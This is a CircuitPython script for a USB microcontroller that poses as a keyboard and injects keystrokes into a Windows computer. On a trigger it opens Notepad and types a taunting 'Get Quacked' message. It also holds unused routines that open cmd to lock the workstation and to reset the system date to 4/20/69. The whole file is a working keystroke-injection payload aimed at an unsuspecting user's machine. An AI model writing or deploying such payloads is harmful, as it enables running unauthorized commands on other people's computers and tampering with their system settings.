import time
import board
import usb_hid
import sys
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from digitalio import DigitalInOut, Direction, Pull

button = DigitalInOut(board.D2)
button.direction = Direction.INPUT
button.pull = Pull.UP
led = DigitalInOut(board.D13)
led.direction = Direction.OUTPUT

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
payload = 0
payload_delivered = 0
time.sleep(2)
print("Ready.")
pause = 0.25
def notepad():
    kbd.press(Keycode.GUI)
    kbd.release_all()
    time.sleep(pause)
    layout.write("notepad")
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    time.sleep(pause)
    kbd.release_all()
    layout.write("   ____      _      ___                   _            _ \n")
    layout.write("  / ___| ___| |_   / _ \ _   _  __ _  ___| | _____  __| |\n")
    layout.write(" | |  _ / _ \ __| | | | | | | |/ _` |/ __| |/ / _ \/ _` |\n")
    layout.write(" | |_| |  __/ |_  | |_| | |_| | (_| | (__|   <  __/ (_| |\n")
    layout.write("  \____|\___|\__|  \__\_\\__,_|\__,_|\___|_|\_\___|\__,_|\n")
    layout.write("_________________________________________________________\n")
    layout.write("| You might want to watch your computer a little closer |\n")
    layout.write("| You also might want to look at your date lol          |\n")
    layout.write("| If  you were smart nothing is changed if not you have,|\n")
    layout.write("| some work to do                                       |\n")
    layout.write("---------------------------------------------------------\n")
    kbd.release_all()
    
def lock():
    time.sleep(pause)
    kbd.press(Keycode.GUI)
    kbd.release_all()
    time.sleep(pause)
    layout.write("cmd")
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(0.5)
    layout.write("Rundll32.exe user32.dll,LockWorkStation & exit")
    kbd.press(Keycode.ENTER), kbd.release_all()
def date():
    time.sleep(pause)
    kbd.press(Keycode.GUI)
    kbd.release_all()
    time.sleep(pause)
    layout.write("cmd")
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(0.5)
    layout.write("date 4/20/69")
    kbd.press(Keycode.ENTER), kbd.release_all()
    
    
while True:
    if button.value is True and payload_delivered is 0:  # run it
        if payload is 0:
            notepad()
            payload_delivered = 1
    if payload_delivered is 1:
     sys.exit()
